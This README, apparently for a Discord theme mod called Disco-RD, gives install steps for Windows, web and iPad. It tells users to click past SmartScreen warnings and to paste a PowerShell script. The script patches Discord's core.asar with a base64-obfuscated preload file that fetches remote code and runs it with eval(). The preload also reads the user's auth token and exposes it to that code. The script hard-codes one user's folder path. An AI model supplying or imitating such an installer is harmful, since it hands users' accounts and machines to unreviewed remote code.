# Disco-RD 
<img src="https://github.com/FiskDk/discord-security-exploiting/raw/master/disco-rd.png" width="128">



  

### Changelog

  

#### Script V2.0

- Fixed errors in the messageEdit module

- added defaultOverlay

- prep work for custom CSS

  

### Features

  

- Custom Dark Discord theme

- Multi platform - (Windows, Web, iPadOS)

- Developer Tools (Disco-RD Studio) (Comming Soon)

  
  

### Screenshots

  

##### Disco-RD for web - Edge - Disco-RD Script V2

![](https://github.com/FiskDk/disco-rd/blob/master/img/Web-Edge-Disco-RD-Script-2.png)

  

##### Disco-RD for Windows - Core V1.9 - Disco-RD Script V2

![](https://github.com/FiskDk/disco-rd/blob/master/img/Windows-Core-1-9-Disco-RD-Script-2.png)

  

##### Disco-RD for iPadOS - iPadOS 13.4.1 (iPad Air 2) - Disco-RD Script V1.8.2

![](https://github.com/FiskDk/disco-rd/blob/master/img/iPadOS-13-4-1-Disco-RD-Script-1-8-2.png)

  

### Known bugs

- In Server Settings the following things are broken : Members, Invites, Bans

  

## Get Disco-RD

###### Disco-RD is currently still in development. Bugs are to be expected.

  

### Windows Tutorial

###### If you have any issues - then try the PowerShell version below

##### Prerequisites 
  * A Windows PC
  * Discord installed
  * [NodeJS](https://nodejs.org/en/)
  * Internet access (duh)

#### Step by step tutorial
* Start by downloading NodeJS and installing it if you dont have it - you can check if you have it by pressing the windows key and searching for `node` - it should look like this if you have it installed

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/nodejs_check.png)

* Now download the installer : [Disco-RD Windows](https://raw.githubusercontent.com/FiskDk/Disco-RD-Windows-Installer/blob/master/Disco-RD%20Injector.exe)
* Now make sure Discord is installed - and running

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/discord_running.png)

* Now open "Disco-RD Injector.exe"
* A window like this should pop up

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/protect.png)

* Click "More info"
*  It should now look like this

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/more_info.png)

* Now click "Run anyway"
* The installer should now open - and you'll see this window

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/rd_gui_first.png)

* Now click the "Install Disco-RD" button
* It will start installing, you'll see some console windows pop up

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/installing.png)

* just let it run until Discord relaunches then click the "Finish" button

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/guiDone.png)

* If it shows up like this 

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/if-only-black.png)

* Then click `CTRL + R` to reload Discord
* It should now look like this

![](https://raw.githubusercontent.com/FiskDk/disco-rd/master/img/win/done.png)

### PowerShell tutorial
###### only use this if the installer dosn't work

* Open a PowerShell CLI by pressing the Windows key + R on your keyboard - then type "powershell" and press enter

* copy the code located on the bottom of this page (scroll all the way down) then paste it in the PowerShell window

* When it says its done, you can go and close the window and launch Discord

If it instantly closes when you run the code, then check if you have NodeJS installed

[NodeJS](https://nodejs.org/en/)

[Install NodeJS without admin permissions](http://abdelraoof.com/blog/2014/11/11/install-nodejs-without-admin-rights/)
  

### iOS and iPadOS Tutorial

  

##### This method is outdated - A new version is comming soon

You need Siri Shortcuts for this to work.

  

[Siri Shortcuts](https://apps.apple.com/us/app/shortcuts/id915249334)

  

When you have Siri Shortcuts installed open the "Settings" app.

Then scroll down until you see "Shortcuts". Then click on that.

Now you will have to enable "Allow Untrusted Shortcuts" - You will be asked to enter your passcode.

After you are done that you can proceed by installing the Disco-RD Shortcut by using the link

  

##### New shortcut with autoupdate is coming soon

  

### Web Tutorial

  

Here is all you need to get started :

  

1 : A compatible browser

  

Officially supported browsers :

Google Chrome

The new Edge (Chromium based)

  

Browsers that "might" work :

Chromium based browsers with extention support

  

2 : A lil time

  

Disco-RD for web is not that complicated to install but it still takes a lil time.

  

How to install :

  

Start by opening a new tab in your browser - in the URL bar type in : "about://extensions" (without the quotes)

  

Find where it says "Developer Mode" and enable that

  

A button should appear saying "Load unpacked" - if not - try to refresh the page - or restart the browser

  

Now download Disco-RD for web by going to

  

[Disco-RD For Web](https://raw.githubusercontent.com/FiskDk/discord-security-exploiting/master/Disco-RD%20For%20Web.zip)

  

Save the file somewhere and extract it

  

You should now have have a folder structure like this :

  

Dir where you extracted |

- web.zip

- Disco-RD Web

  

If not - make sure you dont extract into another folder (example : dir where you extracted\web\Disco-RD Web

  

Now open your browser again - navigate to "about://extensions" (without the quotes) if you werent there already

  

Now click the "Load unpacked" button and navigate to the folder "Disco-RD Web" - then click select folder

  

Now when you go to Discord in your browser you should see Disco-RD


### PowerShell code 

```powershell
$nodeV = (node -v) | Out-String
if ($nodeV.StartsWith("v")) { echo NodeJS Version : $nodeV } else {exit}
Stop-process -Name discord
cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
if (Test-Path "core.old") { remove-item "core.old" }
if (Test-Path "rd") { remove-item "rd" }
npx asar extract core.asar rd
cd rd\app
remove-item "mainScreenPreload.js"
$payload = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String( "J3VzZSBzdHJpY3QnOwpjb25zdCB7IGVycm9yIH0gPSByZXF1aXJlKCdjb25zb2xlJyk7CmNvbnN0IERpc2NvcmROYXRpdmUgPSB7CiAgaXNSZW5kZXJlcjogcHJvY2Vzcy50eXBlID09PSAncmVuZGVyZXInLAogIG5hdGl2ZU1vZHVsZXM6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvbmF0aXZlTW9kdWxlcycpLAogIHByb2Nlc3M6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvcHJvY2VzcycpLAogIG9zOiByZXF1aXJlKCcuL2Rpc2NvcmRfbmF0aXZlL3JlbmRlcmVyL29zJyksCiAgYXBwOiByZXF1aXJlKCcuL2Rpc2NvcmRfbmF0aXZlL3JlbmRlcmVyL2FwcCcpLAogIGNsaXBib2FyZDogcmVxdWlyZSgnLi9kaXNjb3JkX25hdGl2ZS9yZW5kZXJlci9jbGlwYm9hcmQnKSwKICBpcGM6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvaXBjJyksCiAgZ3B1U2V0dGluZ3M6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvZ3B1U2V0dGluZ3MnKSwKICB3aW5kb3c6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvd2luZG93JyksCiAgcG93ZXJNb25pdG9yOiByZXF1aXJlKCcuL2Rpc2NvcmRfbmF0aXZlL3JlbmRlcmVyL3Bvd2VyTW9uaXRvcicpLAogIHNwZWxsQ2hlY2s6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvc3BlbGxDaGVjaycpLAogIGNyYXNoUmVwb3J0ZXI6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvY3Jhc2hSZXBvcnRlcicpLAogIGRlc2t0b3BDYXB0dXJlOiByZXF1aXJlKCcuL2Rpc2NvcmRfbmF0aXZlL3JlbmRlcmVyL2Rlc2t0b3BDYXB0dXJlJyksCiAgZmlsZU1hbmFnZXI6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvZmlsZU1hbmFnZXInKSwKICBwcm9jZXNzVXRpbHM6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvcHJvY2Vzc1V0aWxzJyksCiAgcG93ZXJTYXZlQmxvY2tlcjogcmVxdWlyZSgnLi9kaXNjb3JkX25hdGl2ZS9yZW5kZXJlci9wb3dlclNhdmVCbG9ja2VyJyksCiAgaHR0cDogcmVxdWlyZSgnLi9kaXNjb3JkX25hdGl2ZS9yZW5kZXJlci9odHRwJyksCiAgYWNjZXNzaWJpbGl0eTogcmVxdWlyZSgnLi9kaXNjb3JkX25hdGl2ZS9yZW5kZXJlci9hY2Nlc3NpYmlsaXR5JyksCiAgZmVhdHVyZXM6IHJlcXVpcmUoJy4vZGlzY29yZF9uYXRpdmUvcmVuZGVyZXIvZmVhdHVyZXMnKSwKICBzZXR0aW5nczogcmVxdWlyZSgnLi9kaXNjb3JkX25hdGl2ZS9yZW5kZXJlci9zZXR0aW5ncycpCn07CkRpc2NvcmROYXRpdmUucmVtb3RlQXBwID0gRGlzY29yZE5hdGl2ZS5hcHA7CkRpc2NvcmROYXRpdmUucmVtb3RlUG93ZXJNb25pdG9yID0gRGlzY29yZE5hdGl2ZS5wb3dlck1vbml0b3I7CmNvbnN0IF9zZXRJbW1lZGlhdGUgPSBzZXRJbW1lZGlhdGU7CmNvbnN0IF9jbGVhckltbWVkaWF0ZSA9IGNsZWFySW1tZWRpYXRlOwpwcm9jZXNzLm9uY2UoJ2xvYWRlZCcsICgpID0+IHsKICBjb25zdCBnZXRTY3JpcHQgPSAodXJsKSA9PiB7IC8vIGZ1bmN0aW9uIHRvIGdldCBzY3JpcHRzIGZyb20gZ2l0aHViCiAgICByZXR1cm4gbmV3IFByb21pc2UoKHJlc29sdmUsIHJlamVjdCkgPT4gewogICAgICAgIGNvbnN0IGh0dHAgICAgICA9IHJlcXVpcmUoJ2h0dHAnKSwKICAgICAgICAgICAgICBodHRwcyAgICAgPSByZXF1aXJlKCdodHRwcycpOwogICAgICAgIGxldCBjbGllbnQgPSBodHRwOwogICAgICAgIGlmICh1cmwudG9TdHJpbmcoKS5pbmRleE9mKCJodHRwcyIpID09PSAwKSB7CiAgICAgICAgICAgIGNsaWVudCA9IGh0dHBzOwogICAgICAgIH0KICAgICAgICBjbGllbnQuZ2V0KHVybCwgKHJlc3ApID0+IHsKICAgICAgICAgICAgbGV0IGRhdGEgPSAnJzsKICAgICAgICAgICAgcmVzcC5vbignZGF0YScsIChjaHVuaykgPT4gewogICAgICAgICAgICAgICAgZGF0YSArPSBjaHVuazsKICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIHJlc3Aub24oJ2VuZCcsICgpID0+IHsKICAgICAgICAgICAgICAgIHJlc29sdmUoZGF0YSk7CiAgICAgICAgICAgIH0pOwogICAgICAgIH0pLm9uKCJlcnJvciIsIChlcnIpID0+IHsKICAgICAgICAgICAgcmVqZWN0KGVycik7CiAgICAgICAgfSk7CiAgICB9KTsKICB9OwogIHZhciByZFNjcmlwdCA9ICIiCiAgdmFyIHJkVGhlbWUgPSAiIgphc3luYyBmdW5jdGlvbiBnZXRTY3JpcHRzKCl7IC8vZ2V0IHRoZSBtYWluIHNjcmlwdCBhbmQgdGhlIG5ldyBvdmVybGF5IGZyb20gZ2l0aHViIGFuZCBsb2FkIHRoZW0gaW50byB2YXJzCiAgcmRTY3JpcHQgPSBhd2FpdCBnZXRTY3JpcHQoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9GaXNrRGsvZGlzY29yZC1zZWN1cml0eS1leHBsb2l0aW5nL21hc3Rlci9jc3MudHh0Iik7CiAgcmRUaGVtZSA9IGF3YWl0IGdldFNjcmlwdCgnaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0Zpc2tEay9kaXNjb3JkLXNlY3VyaXR5LWV4cGxvaXRpbmcvbWFzdGVyL2RlZmF1bHRPdmVybGF5LmNzcycpOwp9CmdldFNjcmlwdHMoKTsKICBnbG9iYWwuRGlzY29yZE5hdGl2ZSA9IERpc2NvcmROYXRpdmU7CiAgZ2xvYmFsLnNldEltbWVkaWF0ZSA9IF9zZXRJbW1lZGlhdGU7CiAgZ2xvYmFsLmNsZWFySW1tZWRpYXRlID0gX2NsZWFySW1tZWRpYXRlOwogIHZhciB0b2tlbj1sb2NhbFN0b3JhZ2UuZ2V0SXRlbSgidG9rZW4iKQogIHdpbmRvdy5hZGRFdmVudExpc3RlbmVyKCdsb2FkJywgZnVuY3Rpb24gKCkgewpjb25zdCBsb2FkZXJfbG9hZGVyX3dhaXRVbnRpbEVsZW1lbnRFeGlzdHMgPSAoc2VsZWN0b3IsIGNhbGxiYWNrKSA9PiB7CiAgY29uc3QgZWwgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKHNlbGVjdG9yKTsKICBpZiAoZWwpIHsKICAgICAgcmV0dXJuIGNhbGxiYWNrKGVsKTsKICB9CiAgc2V0VGltZW91dCgoKSA9PiBsb2FkZXJfbG9hZGVyX3dhaXRVbnRpbEVsZW1lbnRFeGlzdHMoc2VsZWN0b3IsIGNhbGxiYWNrKSwgNTAwKTsKfQpjb25zdCBsb2FkZXJjc3MgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpCmxvYWRlcmNzcy5pbm5lckhUTUwgPSAnLmNvbnRhaW5lci0xNmoyMmt7YmFja2dyb3VuZDp1cmwoZGF0YTppbWFnZS9zdmcreG1sO2Jhc2U2NCxQSE4yWnlCNGJXeHVjejBpYUhSMGNEb3ZMM2QzZHk1M015NXZjbWN2TWpBd01DOXpkbWNpSUhodGJHNXpPbmhzYVc1clBTSm9kSFJ3T2k4dmQzZDNMbmN6TG05eVp5OHhPVGs1TDNoc2FXNXJJaUIzYVdSMGFEMGlNVEF3SlNJZ2FHVnBaMmgwUFNJeE1EQWxJajQ4WkdWbWN6NDhjR0YwZEdWeWJpQnBaRDBpY0dGMGRHVnliaUlnZDJsa2RHZzlJams0TGpFMUlpQm9aV2xuYUhROUlqZzFJaUIyYVdWM1FtOTRQU0l3SURBZ016UXVOalF4TURFMk1UVXhNemMzTlRVc016QWlJSEJoZEhSbGNtNVZibWwwY3owaWRYTmxjbE53WVdObFQyNVZjMlVpSUhCaGRIUmxjbTVVY21GdWMyWnZjbTA5SW5KdmRHRjBaU2d5TWpFcElqNDhjbVZqZENCcFpEMGljR0YwZEdWeWJpMWlZV05yWjNKdmRXNWtJaUIzYVdSMGFEMGlOREF3SlNJZ2FHVnBaMmgwUFNJME1EQWxJaUJtYVd4c1BTSWpNREF3TURBd0lqNDhMM0psWTNRK0lEeHdZWFJvSUdacGJIUmxjajBpZFhKc0tDTm1hV3gwWlhJeGNHRjBkR1Z5YmlraUlHWnBiR3c5SWlNeU9UQTFNek1pSUdROUlrMHRNakFnTFRJd0lHZ3lNREFnZGpJd01DQm9MVEl3TUNCTk16SXVPVEVnTWpaTU1qVXVPVGdnTWpKTU1Ua3VNRFVnTWpaTU1Ua3VNRFVnTXpSTU1qVXVPVGdnTXpoTU16SXVPVEVnTXpSNlRURTFMalU1SURJMlREZ3VOallnTWpKTU1TNDNNeUF5Tmt3eExqY3pJRE0wVERndU5qWWdNemhNTVRVdU5Ua2dNelI2VFRZdU9UTWdNVEZNTUNBM1RDMDJMamt6SURFeFRDMDJMamt6SURFNVREQWdNak5NTmk0NU15QXhPWHBOTVRVdU5Ua2dMVFJNT0M0Mk5pQXRPRXd4TGpjeklDMDBUREV1TnpNZ05FdzRMalkySURoTU1UVXVOVGtnTkhwTk16SXVPVEVnTFRSTU1qVXVPVGdnTFRoTU1Ua3VNRFVnTFRSTU1Ua3VNRFVnTkV3eU5TNDVPQ0E0VERNeUxqa3hJRFI2VFRReExqVTNJREV4VERNMExqWTBJRGRNTWpjdU56RWdNVEZNTWpjdU56RWdNVGxNTXpRdU5qUWdNak5NTkRFdU5UY2dNVGw2VFRJMExqSTFJREV4VERFM0xqTXlJRGRNTVRBdU16a2dNVEZNTVRBdU16a2dNVGxNTVRjdU16SWdNak5NTWpRdU1qVWdNVGw2SWo0OEwzQmhkR2crUEhCaGRHZ2dabWxzZEdWeVBTSjFjbXdvSTJacGJIUmxjakp3WVhSMFpYSnVLU0lnWm1sc2JEMGlJekl5TW1RMU9TSWdaRDBpVFMweU1DQXRNakFnYURJd01DQjJNakF3SUdndE1qQXdJRTAwTVM0NU1TQXlOa3d6TkM0NU9DQXlNa3d5T0M0d05TQXlOa3d5T0M0d05TQXpORXd6TkM0NU9DQXpPRXcwTVM0NU1TQXpOSHBOTWpRdU5Ua2dNalpNTVRjdU5qWWdNakpNTVRBdU56TWdNalpNTVRBdU56TWdNelJNTVRjdU5qWWdNemhNTWpRdU5Ua2dNelI2VFRFMUxqa3pJREV4VERrZ04wd3lMakEzSURFeFRESXVNRGNnTVRsTU9TQXlNMHd4TlM0NU15QXhPWHBOTWpRdU5Ua2dMVFJNTVRjdU5qWWdMVGhNTVRBdU56TWdMVFJNTVRBdU56TWdORXd4Tnk0Mk5pQTRUREkwTGpVNUlEUjZUVFF4TGpreElDMDBURE0wTGprNElDMDRUREk0TGpBMUlDMDBUREk0TGpBMUlEUk1NelF1T1RnZ09FdzBNUzQ1TVNBMGVrMDFNQzQxTnlBeE1VdzBNeTQyTkNBM1RETTJMamN4SURFeFRETTJMamN4SURFNVREUXpMalkwSURJelREVXdMalUzSURFNWVrMDFPUzR5TXlBeU5rdzFNaTR6SURJeVREUTFMak0zSURJMlREUTFMak0zSURNMFREVXlMak1nTXpoTU5Ua3VNak1nTXpSNlRUTXpMakkxSURReFRESTJMak15SURNM1RERTVMak01SURReFRERTVMak01SURRNVRESTJMak15SURVelRETXpMakkxSURRNWVrMDNMakkzSURJMlREQXVNelFnTWpKTUxUWXVOVGtnTWpaTUxUWXVOVGtnTXpSTU1DNHpOQ0F6T0V3M0xqSTNJRE0wZWswM0xqSTNJQzAwVERBdU16UWdMVGhNTFRZdU5Ua2dMVFJNTFRZdU5Ua2dORXd3TGpNMElEaE1OeTR5TnlBMGVrMHpNeTR5TlNBdE1UbE1Nall1TXpJZ0xUSXpUREU1TGpNNUlDMHhPVXd4T1M0ek9TQXRNVEZNTWpZdU16SWdMVGRNTXpNdU1qVWdMVEV4ZWswMU9TNHlNeUF0TkV3MU1pNHpJQzA0VERRMUxqTTNJQzAwVERRMUxqTTNJRFJNTlRJdU15QTRURFU1TGpJeklEUjZUVFV3TGpVM0lEUXhURFF6TGpZMElETTNURE0yTGpjeElEUXhURE0yTGpjeElEUTVURFF6TGpZMElEVXpURFV3TGpVM0lEUTVlazB4TlM0NU15QTBNVXc1SURNM1RESXVNRGNnTkRGTU1pNHdOeUEwT1V3NUlEVXpUREUxTGpreklEUTVlazB0TVM0ek9TQXhNVXd0T0M0ek1pQTNUQzB4TlM0eU5TQXhNVXd0TVRVdU1qVWdNVGxNTFRndU16SWdNak5NTFRFdU16a2dNVGw2VFRFMUxqa3pJQzB4T1V3NUlDMHlNMHd5TGpBM0lDMHhPVXd5TGpBM0lDMHhNVXc1SUMwM1RERTFMamt6SUMweE1YcE5OVEF1TlRjZ0xURTVURFF6TGpZMElDMHlNMHd6Tmk0M01TQXRNVGxNTXpZdU56RWdMVEV4VERRekxqWTBJQzAzVERVd0xqVTNJQzB4TVhwTk5qY3VPRGtnTVRGTU5qQXVPVFlnTjB3MU5DNHdNeUF4TVV3MU5DNHdNeUF4T1V3Mk1DNDVOaUF5TTB3Mk55NDRPU0F4T1hwTk16TXVNalVnTVRGTU1qWXVNeklnTjB3eE9TNHpPU0F4TVV3eE9TNHpPU0F4T1V3eU5pNHpNaUF5TTB3ek15NHlOU0F4T1hvaVBqd3ZjR0YwYUQ0OEwzQmhkSFJsY200K0lEeG1hV3gwWlhJZ2FXUTlJbVpwYkhSbGNqRndZWFIwWlhKdUlqNDhabVZVZFhKaWRXeGxibU5sSUdKaGMyVkdjbVZ4ZFdWdVkzazlJakF1TURFZ01DSWdiblZ0VDJOMFlYWmxjejBpTWlJZ2NtVnpkV3gwUFNKeVpYTjFiSFF4SWo0OEwyWmxWSFZ5WW5Wc1pXNWpaVDQ4Wm1WRWFYTndiR0ZqWlcxbGJuUk5ZWEFnYVc0eVBTSnlaWE4xYkhReElpQnpZMkZzWlQwaU1DSWdjbVZ6ZFd4MFBTSnlaWE4xYkhReUlpQjRRMmhoYm01bGJGTmxiR1ZqZEc5eVBTSlNJaUI1UTJoaGJtNWxiRk5sYkdWamRHOXlQU0pISWlCcGJqMGlVMjkxY21ObFIzSmhjR2hwWXlJK1BDOW1aVVJwYzNCc1lXTmxiV1Z1ZEUxaGNENDhabVZEYjIxd2IzTnBkR1VnYVc0eVBTSnlaWE4xYkhReUlpQnBiajBpVTI5MWNtTmxSM0poY0docFl5SWdiM0JsY21GMGIzSTlJbUYwYjNBaUlISmxjM1ZzZEQwaVkyOXRjRzl6YVhSbFIzSmhjR2hwWXlJK1BDOW1aVU52YlhCdmMybDBaVDQ4Wm1WUFptWnpaWFFnYVc0OUltTnZiWEJ2YzJsMFpVZHlZWEJvYVdNaUlISmxjM1ZzZEQwaVptSlRiM1Z5WTJWSGNtRndhR2xqSWlCa2VEMGlNQ0krUEM5bVpVOW1abk5sZEQ0OEwyWnBiSFJsY2o0Z1BHWnBiSFJsY2lCcFpEMGlabWxzZEdWeU1uQmhkSFJsY200aVBqeG1aVlIxY21KMWJHVnVZMlVnWW1GelpVWnlaWEYxWlc1amVUMGlNQ0F3TGpBeElpQnVkVzFQWTNSaGRtVnpQU0l5SWlCeVpYTjFiSFE5SW5KbGMzVnNkREVpUGp3dlptVlVkWEppZFd4bGJtTmxQanhtWlVScGMzQnNZV05sYldWdWRFMWhjQ0JwYmpJOUluSmxjM1ZzZERFaUlITmpZV3hsUFNJd0lpQnlaWE4xYkhROUluSmxjM1ZzZERJaUlIaERhR0Z1Ym1Wc1UyVnNaV04wYjNJOUlsSWlJSGxEYUdGdWJtVnNVMlZzWldOMGIzSTlJa2NpSUdsdVBTSlRiM1Z5WTJWSGNtRndhR2xqSWo0OEwyWmxSR2x6Y0d4aFkyVnRaVzUwVFdGd1BqeG1aVU52YlhCdmMybDBaU0JwYmpJOUluSmxjM1ZzZERJaUlHbHVQU0pUYjNWeVkyVkhjbUZ3YUdsaklpQnZjR1Z5WVhSdmNqMGlZWFJ2Y0NJZ2NtVnpkV3gwUFNKamIyMXdiM05wZEdWSGNtRndhR2xqSWo0OEwyWmxRMjl0Y0c5emFYUmxQanhtWlU5bVpuTmxkQ0JwYmowaVkyOXRjRzl6YVhSbFIzSmhjR2hwWXlJZ2NtVnpkV3gwUFNKbVlsTnZkWEpqWlVkeVlYQm9hV01pSUdSNVBTSXdJajQ4TDJabFQyWm1jMlYwUGp3dlptbHNkR1Z5UGp3dlpHVm1jejRnUEhKbFkzUWdabWxzYkQwaWRYSnNLQ053WVhSMFpYSnVLU0lnYUdWcFoyaDBQU0l4TURBbElpQjNhV1IwYUQwaU1UQXdKU0krUEM5eVpXTjBQand2YzNablBnPT0pfS5yZC1yb3VuZGVke2JvcmRlci1yYWRpdXM6MjVweDtiYWNrZ3JvdW5kOiMwNDA0MDQ7cGFkZGluZzoyMHB4O3dpZHRoOjYwJTttYXJnaW4tYm90dG9tOjIwcHg7bWFyZ2luLWxlZnQ6YXV0bzttYXJnaW4tcmlnaHQ6YXV0b30nCmRvY3VtZW50LmRvY3VtZW50RWxlbWVudC5hcHBlbmRDaGlsZChsb2FkZXJjc3MpCmZ1bmN0aW9uIGNvbm5lY3Rpb25Qcm9ibGVtcygpewpsZXQgcmRFcnJvciA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoImEiKQpyZEVycm9yLmlubmVyVGV4dD0iRXJyb3JzIHdpdGggRGlzY29SRCIKcmRFcnJvci5ocmVmPSJodHRwczovL3NlcmdhbC5zaXRlL3JkL2Vycm9yIgpyZEVycm9yLmNsYXNzTGlzdD1bCiAgImFuY2hvci0zWi04QmIiLAogICAiYW5jaG9yVW5kZXJsaW5lT25Ib3Zlci0yRVNIUUIiLAogICAgInN0YXR1c0xpbmstZ0ZYaHJMIGxpbmtzLTNMZGQ0QSJdCmRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoInByb2JsZW1zLTNtZ2Y2dyBzbGlkZUluLXNDdnpHeiIpWzBdLmNoaWxkcmVuWzFdLmFwcGVuZENoaWxkKHJkRXJyb3IpCmRvY3VtZW50LmdldEVsZW1lbnRzQnlDbGFzc05hbWUoInByb2JsZW1zLTNtZ2Y2dyBzbGlkZUluLXNDdnpHeiIpWzBdLmNsYXNzTGlzdC5hZGQoInJkLXJvdW5kZWQiKQpsb2FkZXJfbG9hZGVyX3dhaXRVbnRpbEVsZW1lbnRFeGlzdHMoJy5wcm9ibGVtcy0zbWdmNncgLnNsaWRlSW4tc0N2ekd6JywgKGVsKSA9Pgpjb25uZWN0aW9uUHJvYmxlbXMoKQopOwp9CiAgICBjb25zb2xlLmxvZygiVHJ5aW5nIHRvIGluamVjdCBEaXNjby1SRCIpOwogICAgY29uc29sZS5sb2coIkRpc2NvLVJEIENsaWVudCBbU1RBQkxFXSAyLjAgLSBjb21waWxlZCAwNy80LzIwMjAiKTsKdHJ5IHsKbGV0IHJkX292ZXJsYXkgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzdHlsZSIpCnJkX292ZXJsYXkuaW5uZXJIVE1MID0gcmRUaGVtZQpjb25zb2xlLmxvZyhyZFRoZW1lKQpyZF9vdmVybGF5LmlkPSJkZWZhdWx0T3ZlcmxheSIKcmRfb3ZlcmxheS5yZWwgPSAic3R5bGVzaGVldCIKcmRfb3ZlcmxheS50eXBlID0gInRleHQvY3NzIgpkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQocmRfb3ZlcmxheSkKZXZhbChyZFNjcmlwdCkKdHJ5IHsKICAvL0NyZWF0ZXMgZWxlbWVudCB3aXRoIHVzZXIgdG9rZW4gLSB1c2VkIGZvciB0aGUgYmF0Y2ggbWVzc2FnZSBkZWxldGVyIC0gY3VycmVudGx5IG5vdCB3b3JraW5nCiAgdmFyIGluZm8gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJhIikKICBpbmZvLmlkID0gInJkSW5mbyIKICBpbmZvLmNsYXNzID0gdG9rZW4KICBpbmZvLmhyZWYgPSAiQ29tbWluZyBTb29uISIKICBkb2N1bWVudC5kb2N1bWVudEVsZW1lbnQuYXBwZW5kQ2hpbGQoaW5mbykKfSBjYXRjaCB7CiAgY29uc29sZS5sb2coIkVycm9yIHdoaWxlIHBhc3NpbmcgdXNlciBhdXRoIikKfQogIH0gY2F0Y2ggKGVycil7CiAgY29uc29sZS5sb2coImVycm9yIHdoaWxlIGxvYWRpbmcgRGlzY28tUkQiICsgZXJyKTsKICB9Cn0pOwp9KQ=="))
Set-Content -Path mainScreenPreload.js -Value $payload
cd C:\Users\f1sk\AppData\Roaming\discord\0.0.*\modules\discord_desktop_core
if (test-path "core.asar") { rename-item "core.asar" "core.old" }
npx asar pack rd core.asar
Remove-Item -Recurse -Force "rd"
echo "You can now launch Discord - Thanks for installing Disco-RD <3 - if you need help - contact me f1sk#3621 on Discord"
<3 - you can close this now
```
